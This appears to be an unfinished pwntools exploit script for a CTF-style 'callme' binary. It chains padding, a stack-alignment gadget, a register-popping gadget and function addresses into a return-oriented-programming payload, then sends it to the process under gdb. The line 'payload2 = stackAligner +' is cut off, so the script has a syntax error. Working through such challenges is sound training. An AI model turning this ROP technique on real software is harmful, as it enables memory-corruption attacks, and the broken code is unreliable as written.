from pwn import *

# chall = process("./callme")
chall = gdb.debug("./callme")

padding = b"A"*40
stackAligner = p64(0x004007c9)
callme_oneAddr = p64(0x00400720)
callme_twoAddr = p64(0x00400740)
callme_threeAddr = p64(0x004006f0)

registerGadget = p64(0x000000000040093c) #pops rdi, rsi, and rdx then returns
callmePayload =  p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) 

# 1. padding
# 2. stack align
# 3. do the register rop (make sure the payload is loaded)
# 4. stack align AGIAN
# 5. callme

# payload 1 successfully completes callme_one
payload1 = padding + stackAligner + registerGadget + callmePayload + stackAligner + callme_oneAddr

payload2 = stackAligner +

chall.sendafter(b"> ", payload1)
chall.interactive() 
